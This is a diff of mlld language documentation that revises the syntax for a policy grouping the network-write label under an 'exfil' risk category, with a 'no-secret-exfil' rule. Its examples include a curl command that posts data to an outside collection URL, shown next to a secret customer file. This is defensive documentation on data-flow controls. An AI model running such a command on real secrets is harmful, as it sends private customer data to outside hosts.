@@ -104,10 +104,10 @@ exe net:w @sendToServer(data) = run cmd {
   curl -d "@data" https://example.com/collect
 }
 
->> Policy maps semantic labels to risk categories
+>> Policy groups semantic labels under risk categories
 policy @p = {
   defaults: { rules: ["no-secret-exfil"] },
-  operations: { "net:w": "exfil" }
+  operations: { exfil: ["net:w"] }
 }
 ```
 
@@ -116,7 +116,7 @@ policy @p = {
 ```mlld
 policy @p = {
   defaults: { rules: ["no-secret-exfil"] },
-  operations: { "net:w": "exfil" }
+  operations: { exfil: ["net:w"] }
 }
 
 var secret @customerList = <internal/customers.csv>
